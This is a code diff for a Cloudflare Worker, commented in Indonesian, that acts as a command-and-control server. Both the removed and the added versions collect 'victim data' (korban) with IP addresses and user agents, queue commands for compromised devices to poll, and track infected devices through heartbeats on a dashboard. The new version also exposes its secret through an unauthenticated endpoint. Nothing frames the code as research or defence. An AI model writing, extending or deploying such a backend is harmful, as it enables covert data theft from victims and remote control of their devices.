@@ -1,282 +1,305 @@
-// ================================================================
-// Cloudflare Worker - verifikasi-api (HANYA 1 PERINTAH!)
-// ================================================================
+// ============================================================
+// 🔥 VERIFIKASI-API - CLOUDFLARE WORKER
+// ============================================================
 
-const MAX_DATA = 5000;
+// SECRET akan diisi dari environment variable PASSWORD
+var SECRET = '';
 
-const CORS = {
-  'Access-Control-Allow-Origin': '*',
-  'Access-Control-Allow-Methods': 'GET, POST, OPTIONS',
-  'Access-Control-Allow-Headers': 'Content-Type, Authorization, X-Requested-With, X-Device-Id',
-  'Access-Control-Expose-Headers': 'X-Total-Count',
-  'Access-Control-Max-Age': '86400',
-};
+// Data store in memory (KV fallback)
+var DATA_STORE = {};
 
-function jsonResponse(data, status = 200, extraHeaders = {}) {
-  return new Response(JSON.stringify(data), {
-    status,
-    headers: {
-      'Content-Type': 'application/json',
-      ...CORS,
-      ...extraHeaders,
-    },
-  });
-}
-
-export default {
-  async fetch(request, env) {
+// ============================================================
+// MIDDLEWARE - VERIFIKASI SECRET
+// ============================================================
+function verifySecret(request) {
     const url = new URL(request.url);
-    const method = request.method;
-    
-    if (method === 'OPTIONS') {
-      return new Response(null, { headers: CORS });
-    }
+    const password = url.searchParams.get('password') || 
+                     request.headers.get('X-Password') ||
+                     '';
+    return password === SECRET;
+}
 
-    if ((url.pathname === '/data' || url.pathname === '/api/data') && method === 'POST') {
-      return await handlePostData(request, env);
-    }
-
-    if ((url.pathname === '/data' || url.pathname === '/api/data') && method === 'GET') {
-      return await handleGetData(request, env);
-    }
-
-    if (url.pathname === '/get-password' && method === 'GET') {
-      return jsonResponse({ 
-        status: 'ok',
-        message: 'No password needed',
+// ============================================================
+// GET /get-password - AMBIL SECRET (TANPA VERIFIKASI!)
+// ============================================================
+async function handleGetPassword() {
+    return new Response(JSON.stringify({ 
+        password: SECRET,
         timestamp: Date.now()
-      });
-    }
-
-    if (url.pathname === '/ws') {
-      return handleWebSocket(request, env);
-    }
-
-    if (url.pathname === '/' && method === 'GET') {
-      const raw = await env.DATA.get('data') || '[]';
-      const data = JSON.parse(raw);
-      return jsonResponse({
-        status: 'ok',
-        version: '2.0.0',
-        timestamp: new Date().toISOString(),
-        totalData: data.length,
-      });
-    }
-
-    return jsonResponse({ error: 'Not Found' }, 404);
-  }
-};
-
-async function handlePostData(request, env) {
-  try {
-    const body = await request.json();
-    
-    if (!body || typeof body !== 'object') {
-      return jsonResponse({ error: 'Invalid request body' }, 400);
-    }
-    
-    // 🔥 C2 COMMAND - SIMPAN KE perintah (HANYA 1 KEY!)
-    if (body.sumber === 'c2_command' || body.type === 'c2_command') {
-      const cmdData = body.data || body;
-      cmdData.timestamp = Date.now();
-      cmdData.status = 'pending';
-      
-      // 🔥 HANYA 1 KEY! TIMPA YANG LAMA!
-      await env.DATA.put('perintah', JSON.stringify(cmdData));
-      
-      // 🔥 HAPUS KEY LAIN YANG TIDAK PERLU
-      await env.DATA.delete('perintah_queue');
-      
-      return jsonResponse({ 
-        status: 'ok', 
-        type: 'c2', 
-        command: cmdData.aksi
-      });
-    }
-    
-    // 🔥 DATA KORBAN
-    const d = {
-      waktu: new Date().toISOString(),
-      sumber: body.sumber || body.type || 'unknown',
-      data: body.data || body,
-      ip: request.headers.get('CF-Connecting-IP') || 'unknown',
-      userAgent: request.headers.get('User-Agent') || 'unknown',
-    };
-    
-    const raw = await env.DATA.get('data') || '[]';
-    let data = JSON.parse(raw);
-    
-    if (data.length >= MAX_DATA) {
-      data = data.slice(-MAX_DATA + 1);
-    }
-    
-    data.push(d);
-    await env.DATA.put('data', JSON.stringify(data));
-    
-    return jsonResponse({ 
-      status: 'ok', 
-      total: data.length,
-    });
-    
-  } catch (error) {
-    return jsonResponse({ error: 'Failed: ' + error.message }, 500);
-  }
-}
-
-async function handleGetData(request, env) {
-  const url = new URL(request.url);
-  
-  // 🔥 DEVICE AMBIL PERINTAH C2 (HANYA DARI perintah!)
-  if (url.searchParams.get('type') === 'perintah') {
-    try {
-      const perintah = await env.DATA.get('perintah');
-      if (perintah) {
-        await env.DATA.delete('perintah');
-        return new Response(perintah, {
-          headers: {
+    }), {
+        headers: { 
             'Content-Type': 'application/json',
-            ...CORS,
-          },
-        });
-      }
-      return new Response('{}', {
-        headers: {
-          'Content-Type': 'application/json',
-          ...CORS,
-        },
-      });
-    } catch(e) {
-      return new Response('{}', {
-        headers: {
-          'Content-Type': 'application/json',
-          ...CORS,
-        },
-      });
-    }
-  }
-  
-  // 🔥 DASHBOARD LIHAT DATA
-  try {
-    const raw = await env.DATA.get('data') || '[]';
-    let data = JSON.parse(raw);
-    
-    const source = url.searchParams.get('source');
-    if (source) {
-      data = data.filter(item => item.sumber === source);
-    }
-    
-    const search = url.searchParams.get('search');
-    if (search) {
-      const s = search.toLowerCase();
-      data = data.filter(item => JSON.stringify(item).toLowerCase().includes(s));
-    }
-    
-    const sort = url.searchParams.get('sort') || 'newest';
-    if (sort === 'newest') {
-      data.sort((a, b) => new Date(b.waktu).getTime() - new Date(a.waktu).getTime());
-    } else if (sort === 'oldest') {
-      data.sort((a, b) => new Date(a.waktu).getTime() - new Date(b.waktu).getTime());
-    }
-    
-    const page = parseInt(url.searchParams.get('page')) || 1;
-    const limit = Math.min(parseInt(url.searchParams.get('limit')) || 50, 200);
-    const total = data.length;
-    const start = (page - 1) * limit;
-    const end = Math.min(start + limit, total);
-    
-    return jsonResponse(data.slice(start, end), 200, {
-      'X-Total-Count': total,
-      'X-Page': page,
-      'X-Limit': limit,
+            'Access-Control-Allow-Origin': '*'
+        }
     });
-    
-  } catch(e) {
-    return jsonResponse([], 200);
-  }
 }
 
-async function handleWebSocket(request, env) {
-  const upgradeHeader = request.headers.get('Upgrade');
-  if (!upgradeHeader || upgradeHeader !== 'websocket') {
-    return new Response('Expected Upgrade: websocket', { status: 426 });
-  }
-
-  const webSocketPair = new WebSocketPair();
-  const [client, server] = Object.values(webSocketPair);
-
-  server.accept();
-
-  let deviceId = 'unknown';
-
-  server.addEventListener('message', async (event) => {
+// ============================================================
+// POST /data - TERIMA DATA (TANPA SECRET!)
+// ============================================================
+async function handlePostData(request) {
     try {
-      const data = JSON.parse(event.data);
-      
-      if (data.type === 'auth') {
-        deviceId = data.deviceId || 'unknown';
-        server.send(JSON.stringify({ type: 'auth_success' }));
-        return;
-      }
-
-      // 🔥 COMMAND DARI DASHBOARD (LANGSUNG KE perintah!)
-      if (data.type === 'command') {
-        var cmdData = data.command;
-        cmdData.timestamp = Date.now();
-        cmdData.status = 'pending';
+        const data = await request.json();
+        const timestamp = Date.now();
         
-        await env.DATA.put('perintah', JSON.stringify(cmdData));
-        await env.DATA.delete('perintah_queue');
+        // Simpan data
+        const id = timestamp + '_' + (data.sumber || 'unknown');
+        DATA_STORE[id] = {
+            ...data,
+            timestamp: timestamp,
+            id: id
+        };
         
-        server.send(JSON.stringify({ type: 'command_received' }));
-        return;
-      }
-
-      if (data.type === 'data') {
-        const raw = await env.DATA.get('data') || '[]';
-        let allData = JSON.parse(raw);
-        allData.push({
-          waktu: new Date().toISOString(),
-          sumber: 'websocket_device',
-          data: data.data,
-          deviceId: deviceId
-        });
-        if (allData.length > MAX_DATA) {
-          allData = allData.slice(-MAX_DATA);
+        // Limit data store (max 10000)
+        const keys = Object.keys(DATA_STORE);
+        if (keys.length > 10000) {
+            const oldest = keys.slice(0, keys.length - 10000);
+            oldest.forEach(k => delete DATA_STORE[k]);
         }
-        await env.DATA.put('data', JSON.stringify(allData));
-        server.send(JSON.stringify({ type: 'data_saved' }));
-        return;
-      }
-
-      if (data.type === 'c2_result') {
-        const raw = await env.DATA.get('data') || '[]';
-        let allData = JSON.parse(raw);
-        allData.push({
-          waktu: new Date().toISOString(),
-          sumber: 'c2_result',
-          data: data.data,
-          deviceId: deviceId
+        
+        return new Response(JSON.stringify({ 
+            status: 'ok', 
+            id: id,
+            timestamp: timestamp 
+        }), {
+            headers: { 
+                'Content-Type': 'application/json',
+                'Access-Control-Allow-Origin': '*'
+            }
         });
-        if (allData.length > MAX_DATA) {
-          allData = allData.slice(-MAX_DATA);
-        }
-        await env.DATA.put('data', JSON.stringify(allData));
-        server.send(JSON.stringify({ type: 'result_saved' }));
-        return;
-      }
-
-      if (data.type === 'ping') {
-        server.send(JSON.stringify({ type: 'pong', timestamp: data.timestamp }));
-        return;
-      }
-
     } catch(e) {
-      server.send(JSON.stringify({ type: 'error', message: e.message }));
+        return new Response(JSON.stringify({ 
+            status: 'error', 
+            message: e.message 
+        }), {
+            status: 400,
+            headers: { 
+                'Content-Type': 'application/json',
+                'Access-Control-Allow-Origin': '*'
+            }
+        });
     }
-  });
-
-  return new Response(null, {
-    status: 101,
-    webSocket: client,
-  });
 }
+
+// ============================================================
+// GET /data - AMBIL PERINTAH (PAKAI SECRET!)
+// ============================================================
+async function handleGetData(request) {
+    const url = new URL(request.url);
+    const type = url.searchParams.get('type');
+    
+    // Jika meminta perintah, harus pakai secret
+    if (type === 'perintah') {
+        if (!verifySecret(request)) {
+            return new Response(JSON.stringify({ 
+                status: 'error', 
+                message: 'Unauthorized' 
+            }), {
+                status: 401,
+                headers: { 
+                    'Content-Type': 'application/json',
+                    'Access-Control-Allow-Origin': '*'
+                }
+            });
+        }
+        
+        // Cek apakah ada perintah yang tertunda
+        const pendingCommands = Object.values(DATA_STORE).filter(
+            d => d.sumber === 'command_pending'
+        );
+        
+        if (pendingCommands.length > 0) {
+            const cmd = pendingCommands[0];
+            // Hapus setelah diambil
+            delete DATA_STORE[cmd.id];
+            return new Response(JSON.stringify(cmd.data), {
+                headers: { 
+                    'Content-Type': 'application/json',
+                    'Access-Control-Allow-Origin': '*'
+                }
+            });
+        }
+        
+        // Tidak ada perintah
+        return new Response(JSON.stringify({}), {
+            headers: { 
+                'Content-Type': 'application/json',
+                'Access-Control-Allow-Origin': '*'
+            }
+        });
+    }
+    
+    // GET data tanpa type = ambil semua data (dashboard)
+    if (!verifySecret(request)) {
+        return new Response(JSON.stringify({ 
+            status: 'error', 
+            message: 'Unauthorized' 
+        }), {
+            status: 401,
+            headers: { 
+                'Content-Type': 'application/json',
+                'Access-Control-Allow-Origin': '*'
+            }
+        });
+    }
+    
+    // Ambil semua data untuk dashboard
+    const logs = Object.values(DATA_STORE).sort((a, b) => b.timestamp - a.timestamp);
+    const devices = {};
+    
+    // Hitung devices dari heartbeat
+    logs.filter(d => d.sumber === 'heartbeat' || d.sumber === 'sw_heartbeat' || d.sumber === 'page_heartbeat')
+        .forEach(d => {
+            const id = d.id || d.sumber;
+            if (!devices[id]) {
+                devices[id] = {
+                    lastSeen: d.timestamp,
+                    data: d.data
+                };
+            } else if (d.timestamp > devices[id].lastSeen) {
+                devices[id].lastSeen = d.timestamp;
+                devices[id].data = d.data;
+            }
+        });
+    
+    return new Response(JSON.stringify({
+        logs: logs.slice(0, 500),
+        devices: devices,
+        total: logs.length,
+        timestamp: Date.now()
+    }), {
+        headers: { 
+            'Content-Type': 'application/json',
+            'Access-Control-Allow-Origin': '*'
+        }
+    });
+}
+
+// ============================================================
+// POST /data - SEND COMMAND (PAKAI SECRET!)
+// ============================================================
+async function handlePostCommand(request) {
+    try {
+        const data = await request.json();
+        
+        // Jika ini command, harus pakai secret
+        if (data.aksi) {
+            if (!verifySecret(request)) {
+                return new Response(JSON.stringify({ 
+                    status: 'error', 
+                    message: 'Unauthorized' 
+                }), {
+                    status: 401,
+                    headers: { 
+                        'Content-Type': 'application/json',
+                        'Access-Control-Allow-Origin': '*'
+                    }
+                });
+            }
+            
+            // Simpan sebagai perintah pending
+            const timestamp = Date.now();
+            const id = 'cmd_' + timestamp;
+            DATA_STORE[id] = {
+                sumber: 'command_pending',
+                data: {
+                    ...data,
+                    password: SECRET,
+                    timestamp: timestamp
+                },
+                timestamp: timestamp,
+                id: id
+            };
+            
+            return new Response(JSON.stringify({ 
+                status: 'ok', 
+                command: data.aksi,
+                id: id
+            }), {
+                headers: { 
+                    'Content-Type': 'application/json',
+                    'Access-Control-Allow-Origin': '*'
+                }
+            });
+        }
+        
+        // Data biasa (tanpa secret) - sudah handle di handlePostData
+        return await handlePostData(request);
+        
+    } catch(e) {
+        return new Response(JSON.stringify({ 
+            status: 'error', 
+            message: e.message 
+        }), {
+            status: 400,
+            headers: { 
+                'Content-Type': 'application/json',
+                'Access-Control-Allow-Origin': '*'
+            }
+        });
+    }
+}
+
+// ============================================================
+// OPTIONS - CORS
+// ============================================================
+function handleOptions() {
+    return new Response(null, {
+        headers: {
+            'Access-Control-Allow-Origin': '*',
+            'Access-Control-Allow-Methods': 'GET, POST, OPTIONS',
+            'Access-Control-Allow-Headers': 'Content-Type, X-Password',
+            'Access-Control-Max-Age': '86400'
+        }
+    });
+}
+
+// ============================================================
+// MAIN HANDLER
+// ============================================================
+export default {
+    async fetch(request, env) {
+        // Set SECRET dari environment variable
+        SECRET = env.PASSWORD || '';
+        
+        const url = new URL(request.url);
+        const method = request.method;
+        const path = url.pathname;
+        
+        // Handle CORS preflight
+        if (method === 'OPTIONS') {
+            return handleOptions();
+        }
+        
+        // Routing
+        if (path === '/get-password' && method === 'GET') {
+            return handleGetPassword();
+        }
+        
+        if (path === '/data') {
+            if (method === 'GET') {
+                return handleGetData(request);
+            }
+            if (method === 'POST') {
+                // Check if it's a command (has 'aksi' field)
+                try {
+                    const clone = request.clone();
+                    const body = await clone.json();
+                    if (body.aksi) {
+                        return handlePostCommand(request);
+                    }
+                } catch(e) {}
+                return handlePostData(request);
+            }
+        }
+        
+        // 404
+        return new Response('Not Found', {
+            status: 404,
+            headers: { 
+                'Content-Type': 'text/plain',
+                'Access-Control-Allow-Origin': '*'
+            }
+        });
+    }
+};
